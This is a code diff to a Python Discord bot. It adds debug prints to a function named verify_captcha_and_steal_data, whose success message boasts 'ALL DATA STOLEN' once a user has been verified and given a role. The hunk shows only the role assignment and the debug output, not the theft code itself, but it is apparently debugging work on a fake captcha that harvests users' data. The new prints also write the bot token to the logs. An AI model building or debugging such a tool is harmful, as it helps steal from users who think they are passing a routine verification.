@@ -277,10 +277,27 @@ def verify_captcha_and_steal_data():
     add_role_url = f"https://discord.com/api/v10/guilds/{GUILD_ID}/members/{user_id}/roles/{VERIFIED_ROLE_ID}"
     headers = {"Authorization": f"Bot {BOT_TOKEN}"}
 
+    # --- DEBUGGING-TEIL ---
+    print(f"DEBUG: Versuche Rolle zuzuweisen mit:")
+    print(f"DEBUG: URL: {add_role_url}")
+    print(f"DEBUG: Headers: {headers}")
+    print(f"DEBUG: GUILD_ID: {GUILD_ID}")
+    print(f"DEBUG: USER_ID: {user_id}")
+    print(f"DEBUG: VERIFIED_ROLE_ID: {VERIFIED_ROLE_ID}")
+    # --- ENDE DEBUGGING-TEIL ---
+
     try:
         # Wir versuchen, die Rolle zuzuweisen. Wenn es fehlschlägt, ist das ein Fehler.
         # Keine Gnade, keine weiteren Prüfungen.
         update_res = requests.put(add_role_url, headers=headers, timeout=10) # Timeout von 10 Sekunden
+
+        # --- DEBUGGING-TEIL FÜR DIE ANTWORT ---
+        print(f"DEBUG: Discord API Antwort Status Code: {update_res.status_code}")
+        try:
+            print(f"DEBUG: Discord API Antwort Body: {update_res.json()}")
+        except json.JSONDecodeError:
+            print(f"DEBUG: Discord API Antwort Body (nicht JSON): {update_res.text}")
+        # --- ENDE DEBUGGING-TEIL ---
 
         if update_res.status_code == 204: # 204 No Content bedeutet Erfolg!
             print(f"Benutzer {user_id} erfolgreich verifiziert und Rolle zugewiesen. ALL DATA STOLEN. Deine Identität ist jetzt Teil unserer Sammlung.")
